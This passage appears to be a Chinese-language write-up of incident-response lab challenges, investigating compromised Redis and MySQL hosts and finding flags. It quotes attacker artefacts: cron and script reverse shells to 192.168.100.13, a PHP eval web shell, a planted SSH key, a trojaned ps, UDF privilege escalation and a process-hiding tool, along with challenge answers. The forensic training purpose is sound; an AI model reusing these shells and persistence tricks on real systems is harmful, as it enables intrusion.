class="hljs-comment"># Error condition on socket for SYNC: Connection refused</span><br>419:S 31 Jul 2023 05:33:30.641 * Connecting to MASTER 192.168.100.13:8888<br>419:S 31 Jul 2023 05:33:30.641 * MASTER &lt;-&gt; REPLICA <span class="hljs-built_in">sync</span> started<br>419:S 31 Jul 2023 05:33:30.642 <span class="hljs-comment"># Error condition on socket for SYNC: Connection refused</span><br>419:S 31 Jul 2023 05:33:31.643 * Connecting to MASTER 192.168.100.13:8888<br>419:S 31 Jul 2023 05:33:31.643 * MASTER &lt;-&gt; REPLICA <span class="hljs-built_in">sync</span> started<br>419:S 31 Jul 2023 05:33:31.644 <span class="hljs-comment"># Error condition on socket for SYNC: Connection refused</span><br>419:S 31 Jul 2023 05:33:32.644 * Connecting to MASTER 192.168.100.13:8888<br>419:S 31 Jul 2023 05:33:32.645 * MASTER &lt;-&gt; REPLICA <span class="hljs-built_in">sync</span> started<br>419:S 31 Jul 2023 05:33:32.645 <span class="hljs-comment"># Error condition on socket for SYNC: Connection refused</span><br>419:S 31 Jul 2023 05:33:33.647 * Connecting to MASTER 192.168.100.13:8888<br>419:S 31 Jul 2023 05:33:33.647 * MASTER &lt;-&gt; REPLICA <span class="hljs-built_in">sync</span> started<br>419:S 31 Jul 2023 05:33:33.648 <span class="hljs-comment"># Error condition on socket for SYNC: Connection refused</span><br></code></pre></td></tr></table></figure>
<p>会发现很多重复的,但是不是这题答案</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.100.20</span>&#125;<br></code></pre></td></tr></table></figure>
<p>一个一个试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-9:~# <span class="hljs-built_in">cat</span> /var/log/redis.log | grep -oP <span class="hljs-string">&#x27;(?&lt;=Connecting to MASTER )[\d\.]+(?=:\d+)&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr<br>     48 192.168.100.13<br>      2 192.168.100.20<br>      1 192.168.31.55<br></code></pre></td></tr></table></figure>
<h2 id="q2-5"><a class="markdownIt-Anchor" href="#q2-5"></a> Q2</h2>
<p>直接找恶意文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-9:~# <span class="hljs-built_in">ls</span> / -al<br>total 120<br>drwxr-xr-x  18 root root  4096 Mar  4 12:32 .<br>drwxr-xr-x  18 root root  4096 Mar  4 12:32 ..<br>lrwxrwxrwx   1 root root     7 Nov 18  2022 bin -&gt; usr/bin<br>drwxr-xr-x   4 root root  4096 Nov 18  2022 boot<br>drwxr-xr-x  14 root root  2780 Mar  4 12:32 dev<br>-rw-r--r--   1 root root    92 Aug  1  2023 dump.rdb<br>drwxr-xr-x  73 root root  4096 Mar  4 12:32 etc<br>-rw-r--r--   1 root root 48040 Jul 31  2023 exp.so<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-9:~# strings /exp.so |grep <span class="hljs-string">&quot;flag&quot;</span><br>flag&#123;XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q3-5"><a class="markdownIt-Anchor" href="#q3-5"></a> Q3</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-9:~# crontab -l<br><span class="hljs-comment"># Edit this file to introduce tasks to be run by cron.</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment"># Each task to run has to be defined through a single line</span><br><span class="hljs-comment"># indicating with different fields when the task will be run</span><br><span class="hljs-comment"># and what command to run for the task</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment"># To define the time you can provide concrete values for</span><br><span class="hljs-comment"># minute (m), hour (h), day of month (dom), month (mon),</span><br><span class="hljs-comment"># and day of week (dow) or use &#x27;*&#x27; in these fields (for &#x27;any&#x27;).</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment"># Notice that tasks will be started based on the cron&#x27;s system</span><br><span class="hljs-comment"># daemon&#x27;s notion of time and timezones.</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment"># Output of the crontab jobs (including errors) is sent through</span><br><span class="hljs-comment"># email to the user the crontab file belongs to (unless redirected).</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment"># For example, you can run a backup of all your user accounts</span><br><span class="hljs-comment"># at 5 a.m every week with:</span><br><span class="hljs-comment"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment"># For more information see the manual pages of crontab(5) and cron(8)</span><br><span class="hljs-comment"># </span><br>*/1 * * * *  /bin/sh -i &gt;&amp; /dev/tcp/192.168.100.13/7777 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
<p>执行 <code>crontab -l</code> 会显示当前用户的定时任务。黑客常常利用 <strong>cron</strong> 来维持后门访问或周期性执行恶意脚本。</p>
<h2 id="q4-5"><a class="markdownIt-Anchor" href="#q4-5"></a> Q4</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-9:~# <span class="hljs-built_in">cd</span> .ssh<br>root@ip-10-0-10-9:~/.ssh# <span class="hljs-built_in">ls</span><br>authorized_keys<br>root@ip-10-0-10-9:~/.ssh# <span class="hljs-built_in">cat</span> authorized_keys<br>REDIS0009�      redis-ver5.0.1�<br>�edis-bits�@�ctime�tO�dused-mem�XU<br> aof-preamble���xxsshB9<br><br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDh4OEFvyb4ubM7YPvzG/FfO6jE4PjLdmuCUdGP+aeLeJB5SXYT6zHkU9wlfY/Fo4UuBlhTqBaS6Ih/Wf62KepzrMsTQQYcSG/Xp8lgFzVCCFAk7apzxfRCPNk1pxaGiEF6MPoCmUu1UhC3ta3xyh2c4KZls0hyFN9JZsuD+siT8KVqm856vQ+RaTrZi3ThMa5gbeH+v3ZUcO35ZfMKor/uWXffHT0Yi06dsgIMN3faIiBrd1Lg0B5kOTaDq3fHs8Qs7pvR9C4ZTm2AK/Oct8ULdsnfS2YWtrYyC8rzNip9Wf083ZY1B4bj1UoxD+QwgThh5VP3xgRd9KDSzEYIBabstGh8GU5zDxr0zIuhQM35I0aALvojXl4QaaEnZwpqU3ZkojPG2aNC0QdiBK7eKwA38Gk+V8DEWc/TTkO+wm3aXYdll5sPmoWTAonaln1nmCiTDn4jKb73DxYHfSgNIDpJ6fS5kbWL5UJnElWCrxzaXKHUlqXJj3x81Oz6baFNv8= xj-test-user<br></code></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://github.com/xj-test-user/redis-rogue-getshell/commit/6f2bec361360873c49b4e6cd45b81ca5c9456e43#diff-e2fa2f9050e8bd7ab54078195ada26a886f357d57fa44e80b6f76dca29acac48">first commit · xj-test-user/redis-rogue-getshell@6f2bec3</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;xj-test-user-wow-you-find-flag&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q5-4"><a class="markdownIt-Anchor" href="#q5-4"></a> Q5</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-9:/usr/bin# <span class="hljs-built_in">sudo</span> find ./ -<span class="hljs-built_in">type</span> f -perm 777 2&gt;/dev/null<br>./ps<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-9:/usr/bin# <span class="hljs-built_in">cat</span> ps<br><span class="hljs-comment">#/bin/bash</span><br>oldifs=<span class="hljs-string">&quot;<span class="hljs-variable">$IFS</span>&quot;</span><br>IFS=<span class="hljs-string">&#x27;\$n&#x27;</span><br>result=$(ps_ <span class="hljs-variable">$1</span> <span class="hljs-variable">$2</span> <span class="hljs-variable">$3</span>|grep -v <span class="hljs-string">&#x27;threadd&#x27;</span> )<br><span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-keyword">do</span><br>        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;<span class="hljs-variable">$v</span>\t&quot;</span>;<br><span class="hljs-keyword">done</span><br>IFS=<span class="hljs-string">&quot;<span class="hljs-variable">$oldifs</span>&quot;</span><br><span class="hljs-comment">#//c195i2923381905517d818e313792d196</span><br></code></pre></td></tr></table></figure>
<h1 id="第二章日志分析-mysql应急响应"><a class="markdownIt-Anchor" href="#第二章日志分析-mysql应急响应"></a> 第二章日志分析-mysql应急响应</h1>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1.黑客第一次写入的shell flag&#123;关键字符串&#125; <br>2.黑客反弹shell的ip flag&#123;ip&#125;<br>3.黑客提权文件的完整路径 md5 flag&#123;md5&#125; 注 /xxx/xxx/xxx/xxx/xxx.xx<br>4.黑客获取的权限 flag&#123;whoami后的值&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q1-6"><a class="markdownIt-Anchor" href="#q1-6"></a> Q1</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@xuanji:~# <span class="hljs-built_in">ls</span> /<br>1.<span class="hljs-built_in">log</span>  boot  etc   lib    media  opt   root  sbin  supervisord.log  sys  usr<br>bin    dev   home  lib64  mnt    proc  run   srv   supervisord.pid  tmp  var<br>root@xuanji:~# <span class="hljs-built_in">cd</span> /var/www/html<br>root@xuanji:/var/www/html# <span class="hljs-built_in">ls</span><br>Writenote.php  common.php  images     js       search.php  tmpubzil.php  tmpuvdzm.php<br>adminer.php    css         index.php  log.php  sh.php      tmputsrv.php<br>root@xuanji:/var/www/html# <span class="hljs-built_in">cat</span> sh.php<br>1       2       &lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);?&gt;     4<br>//ccfda79e-7aa1-4275-bc26-a6189eb9a20b<br></code></pre></td></tr></table></figure>
<h2 id="q2-6"><a class="markdownIt-Anchor" href="#q2-6"></a> Q2</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@xuanji:/var/log/mysql# <span class="hljs-built_in">ls</span><br>error.log<br>root@xuanji:/var/log/mysql# <span class="hljs-built_in">sudo</span> grep -oE <span class="hljs-string">&#x27;[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+&#x27;</span> error.log | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr<br>      6 0.14.04.1<br>      3 127.0.0.1<br>      2 192.168.100.13<br></code></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.100.13</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q3-6"><a class="markdownIt-Anchor" href="#q3-6"></a> Q3</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs BASH">root@xuanji:~# <span class="hljs-built_in">cd</span> /tmp<br>root@xuanji:/tmp# <span class="hljs-built_in">ls</span><br>1.sh                                    mysql-stderr---supervisor-oNZcZD.<span class="hljs-built_in">log</span>  ssh-stdout---supervisor-QOD15F.<span class="hljs-built_in">log</span><br>apache2-stderr---supervisor-BJwrWU.<span class="hljs-built_in">log</span>  mysql-stdout---supervisor-MHzWNW.<span class="hljs-built_in">log</span>  supervisor.sock<br>apache2-stdout---supervisor-jcN7iK.<span class="hljs-built_in">log</span>  ssh-stderr---supervisor-obsAxv.<span class="hljs-built_in">log</span><br>root@xuanji:/tmp# <span class="hljs-built_in">ls</span> -al<br>total 36<br>drwxrwxrwt. 1 root  root  16384 Mar  4 13:09 .<br>drwxr-xr-x. 1 root  root     85 Mar  4 13:09 ..<br>-rw-rw----. 1 mysql mysql    42 Aug  1  2023 1.sh<br>-rw-------. 1 root  root    700 Mar  4 13:09 apache2-stderr---supervisor-BJwrWU.<span class="hljs-built_in">log</span><br>-rw-------. 1 root  root    124 Mar  4 13:09 apache2-stdout---supervisor-jcN7iK.<span class="hljs-built_in">log</span><br>-rw-------. 1 root  root    155 Mar  4 13:09 mysql-stderr---supervisor-oNZcZD.<span class="hljs-built_in">log</span><br>-rw-------. 1 root  root    153 Mar  4 13:09 mysql-stdout---supervisor-MHzWNW.<span class="hljs-built_in">log</span><br>-rw-------. 1 root  root      0 Mar  4 13:09 ssh-stderr---supervisor-obsAxv.<span class="hljs-built_in">log</span><br>-rw-------. 1 root  root      0 Mar  4 13:09 ssh-stdout---supervisor-QOD15F.<span class="hljs-built_in">log</span><br>srwx------. 1 root  root      0 Mar  4 13:09 supervisor.sock<br>root@xuanji:/tmp# <span class="hljs-built_in">cat</span> 1.sh<br>bash -i &gt;&amp;/dev/tcp/192.168.100.13/777 0&gt;&amp;1root@xuanji:/tmp# <br></code></pre></td></tr></table></figure>
<p><strong>在 MySQL 提权攻击中，最常用的一些方法包括利用 <code>INTO OUTFILE</code> 写入文件、利用 <code>LOAD_FILE</code> 读取文件，以及利用 UDF（用户定义函数）执行系统命令。这些方法因其简单高效、攻击面广而被广泛采用。</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find ./ -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;root&quot;</span><br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@xuanji:~# <span class="hljs-built_in">cd</span> /var/www/html<br>root@xuanji:/var/www/html# find ./ -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;root&quot;</span><br>./common.php:<span class="hljs-variable">$conn</span>=mysqli_connect(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;334cc35b3c704593&quot;</span>,<span class="hljs-string">&quot;cms&quot;</span>,<span class="hljs-string">&quot;3306&quot;</span>);<br>./adminer.php:rootQuery(<span class="hljs-variable">$Yf</span>,<span class="hljs-variable">$_b</span>=array(),<span class="hljs-variable">$Se</span>=<span class="hljs-string">&#x27;GET&#x27;</span>)&#123;@ini_set(<span class="hljs-string">&#x27;track_errors&#x27;</span>,1);<span class="hljs-variable">$Tc</span>=@file_get_contents(<span class="hljs-string">&quot;<span class="hljs-variable">$this</span>-&gt;_url/&quot;</span>.ltrim(<span class="hljs-variable">$Yf</span>,<span class="hljs-string">&#x27;/&#x27;</span>),<span class="hljs-literal">false</span>,stream_context_create(array(<span class="hljs-string">&#x27;http&#x27;</span>=&gt;array(<span class="hljs-string">&#x27;method&#x27;</span>=&gt;<span class="hljs-variable">$Se</span>,<span class="hljs-string">&#x27;content&#x27;</span>=&gt;<span class="hljs-variable">$_b</span>===null?<span class="hljs-variable">$_b</span>:json_encode(<span class="hljs-variable">$_b</span>),<span class="hljs-string">&#x27;header&#x27;</span>=&gt;<span class="hljs-string">&#x27;Content-Type: application/json&#x27;</span>,<span class="hljs-string">&#x27;ignore_errors&#x27;</span>=&gt;1,))));<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$Tc</span>)&#123;<span class="hljs-variable">$this</span>-&gt;error=<span class="hljs-variable">$php_errormsg</span>;<span class="hljs-built_in">return</span><span class="hljs-variable">$Tc</span>;&#125;<span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;~^HTTP/[0-9.]+ 2~i&#x27;</span>,<span class="hljs-variable">$http_response_header</span>[0]))&#123;<span class="hljs-variable">$this</span>-&gt;error=<span class="hljs-variable">$Tc</span>;<span class="hljs-built_in">return</span><br>./adminer.php:query(<span class="hljs-variable">$Yf</span>,<span class="hljs-variable">$_b</span>=array(),<span class="hljs-variable">$Se</span>=<span class="hljs-string">&#x27;GET&#x27;</span>)&#123;<span class="hljs-built_in">return</span><span class="hljs-variable">$this</span>-&gt;rootQuery((<span class="hljs-variable">$this</span>-&gt;_db!=&quot;&quot;?&quot;<span class="hljs-variable">$this</span>-&gt;_db/&quot;:&quot;/&quot;).ltrim(<span class="hljs-variable">$Yf</span>,&#x27;/&#x27;),<span class="hljs-variable">$_b</span>,<span class="hljs-variable">$Se</span>);&#125;function<br>./adminer.php:get_databases()&#123;global<span class="hljs-variable">$h</span>;<span class="hljs-variable">$I</span>=<span class="hljs-variable">$h</span>-&gt;rootQuery(&#x27;_aliases&#x27;);if(<span class="hljs-variable">$I</span>)&#123;<span class="hljs-variable">$I</span>=array_keys(<span class="hljs-variable">$I</span>);sort(<span class="hljs-variable">$I</span>,SORT_STRING);&#125;return<span class="hljs-variable">$I</span>;&#125;function<br>./adminer.php:create_database(<span class="hljs-variable">$m</span>)&#123;global<span class="hljs-variable">$h</span>;return<span class="hljs-variable">$h</span>-&gt;rootQuery(urlencode(<span class="hljs-variable">$m</span>),null,&#x27;PUT&#x27;);&#125;function<br>./adminer.php:drop_databases(<span class="hljs-variable">$l</span>)&#123;global<span class="hljs-variable">$h</span>;return<span class="hljs-variable">$h</span>-&gt;rootQuery(urlencode(implode(&#x27;,&#x27;,<span class="hljs-variable">$l</span>)),array(),<span class="hljs-string">&#x27;DELETE&#x27;</span>);&#125;<span class="hljs-keyword">function</span><br>./adminer.php:rootQuery(<span class="hljs-variable">$m</span>,<span class="hljs-variable">$G</span>)&#123;@ini_set(<span class="hljs-string">&#x27;track_errors&#x27;</span>,1);<span class="hljs-variable">$Tc</span>=@file_get_contents(<span class="hljs-string">&quot;<span class="hljs-variable">$this</span>-&gt;_url/?database=<span class="hljs-variable">$m</span>&quot;</span>,<span class="hljs-literal">false</span>,stream_context_create(array(<span class="hljs-string">&#x27;http&#x27;</span>=&gt;array(<span class="hljs-string">&#x27;method&#x27;</span>=&gt;<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;content&#x27;</span>=&gt;<span class="hljs-variable">$this</span>-&gt;isQuerySelectLike(<span class="hljs-variable">$G</span>)?<span class="hljs-string">&quot;<span class="hljs-variable">$G</span> FORMAT JSONCompact&quot;</span>:<span class="hljs-variable">$G</span>,<span class="hljs-string">&#x27;header&#x27;</span>=&gt;<span class="hljs-string">&#x27;Content-type: application/x-www-form-urlencoded&#x27;</span>,<span class="hljs-string">&#x27;ignore_errors&#x27;</span>=&gt;1,))));<span class="hljs-keyword">if</span>(<span class="hljs-variable">$Tc</span>===<span class="hljs-literal">false</span>)&#123;<span class="hljs-variable">$this</span>-&gt;error=<span class="hljs-variable">$php_errormsg</span>;<span class="hljs-built_in">return</span><span class="hljs-variable">$Tc</span>;&#125;<span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;~^HTTP/[0-9.]+ 2~i&#x27;</span>,<span class="hljs-variable">$http_response_header</span>[0]))&#123;<span class="hljs-variable">$this</span>-&gt;error=<span class="hljs-variable">$Tc</span>;<span class="hljs-built_in">return</span><br>./adminer.php:query(<span class="hljs-variable">$G</span>)&#123;<span class="hljs-built_in">return</span><span class="hljs-variable">$this</span>-&gt;rootQuery(<span class="hljs-variable">$this</span>-&gt;_db,<span class="hljs-variable">$G</span>);&#125;<span class="hljs-keyword">function</span><br></code></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">MariaDB [(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-------+</span><br><span class="hljs-operator">|</span> Variable_name    <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-------+</span><br><span class="hljs-operator">|</span> secure_auth      <span class="hljs-operator">|</span> OFF   <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> secure_file_priv <span class="hljs-operator">|</span>       <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-------+</span><br><span class="hljs-number">2</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@xuanji:~# <span class="hljs-built_in">cd</span> /usr/lib/mysql/plugin/<br>root@xuanji:/usr/lib/mysql/plugin# <span class="hljs-built_in">ls</span><br>auth_pam.so     dialog.so     handlersocket.so         mysqludf.so         semisync_slave.so  sphinx.so      udf.so<br>auth_socket.so  ha_innodb.so  mysql_clear_password.so  semisync_master.so  server_audit.so    sql_errlog.so<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/lib/mysql/plugin/udf.so<br>flag&#123;B1818BDE4E310F3D23F1005185B973E7&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q4-6"><a class="markdownIt-Anchor" href="#q4-6"></a> Q4</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@xuanji:~# ps aux<br>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br>root           1  0.0  0.4  52184 16804 ?        Ss   13:09   0:00 /usr/bin/python /usr/bin/supervisord -n<br>root           9  0.0  0.0  18236  3240 ?        S    13:09   0:00 /bin/bash /usr/bin/mysqld_safe<br>root          10  0.0  0.1  61400  5444 ?        S    13:09   0:00 /usr/sbin/sshd -D<br>mysql        364  0.0  1.6 634320 64572 ?        Sl   13:09   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-d<br>root         401  0.0  0.1  92724  6220 ?        Rs   13:10   0:00 sshd: root@pts/0    <br>root         412  0.0  0.0  18296  3420 pts/0    Ss   13:10   0:00 -bash<br>root         425  0.0  0.0  12836  1952 ?        Ss   13:10   0:00 /usr/lib/openssh/sftp-server<br>root         438  0.0  0.0  12836  1948 ?        Ss   13:11   0:00 /usr/lib/openssh/sftp-server<br>root         665  0.0  0.0  12836  1800 ?        Ss   13:22   0:00 /usr/lib/openssh/sftp-server<br>root         682  0.0  0.0  15584  2064 pts/0    R+   13:26   0:00 ps aux<br></code></pre></td></tr></table></figure>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;mysql&#125;</span><br></code></pre></td></tr></table></figure>
<h1 id="第三章-权限维持-linux权限维持-隐藏"><a class="markdownIt-Anchor" href="#第三章-权限维持-linux权限维持-隐藏"></a> 第三章 权限维持-linux权限维持-隐藏</h1>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1.黑客隐藏的隐藏的文件 完整路径md5<br>2.黑客隐藏的文件反弹shell的ip+端口 &#123;ip:port&#125;<br>3.黑客提权所用的命令 完整路径的md5 flag&#123;md5&#125; <br>4.黑客尝试注入恶意代码的工具完整路径md5<br>5.使用命令运行 ./x.xx 执行该文件  将查询的 Exec<span class="hljs-strong">****</span>** 值 作为flag提交 flag&#123;/xxx/xxx/xxx&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q1-7"><a class="markdownIt-Anchor" href="#q1-7"></a> Q1</h2>
<p>查找隐藏文件是开头带<code>.</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;.*&quot;</span><br>....<br>/tmp/.temp<br>/tmp/.temp/libprocesshider/.git<br>/tmp/.temp/libprocesshider/.gitignore<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">/.dockerenv<br>root@xuanji:~# <span class="hljs-built_in">cd</span> /tmp/.temp/<br>root@xuanji:/tmp/.temp# <span class="hljs-built_in">ls</span><br>libprocesshider<br>root@xuanji:/tmp/.temp# <span class="hljs-built_in">ls</span> -al<br>total 16<br>drwxr-xr-x. 3 root root    29 Aug  3  2023 .<br>drwxrwxrwt. 1 root root 16384 Mar  4 14:11 ..<br>drwxr-xr-x. 3 root root   119 Aug  3  2023 libprocesshider<br>root@xuanji:/tmp/.temp# <span class="hljs-built_in">cd</span> libprocesshider<br>root@xuanji:/tmp/.temp/libprocesshider# <span class="hljs-built_in">ls</span> -al<br>total 24<br>drwxr-xr-x. 3 root root  119 Aug  3  2023 .<br>drwxr-xr-x. 3 root root   29 Aug  3  2023 ..<br>drwxr-xr-x. 8 root root  163 Aug  3  2023 .git<br>-rw-r--r--. 1 root root   20 Aug  3  2023 .gitignore<br>-rwxr-xr-x. 1 root root  826 Aug  3  2023 1.py<br>-rw-r--r--. 1 root root  168 Aug  3  2023 Makefile<br>-rw-r--r--. 1 root root 2941 Aug  3  2023 README.md<br>-rw-r--r--. 1 root root 3477 Aug  3  2023 processhider.c<br>-rw-r--r--. 1 root root  243 Aug  3  2023 shell.py<br></code></pre></td></tr></table></figure>
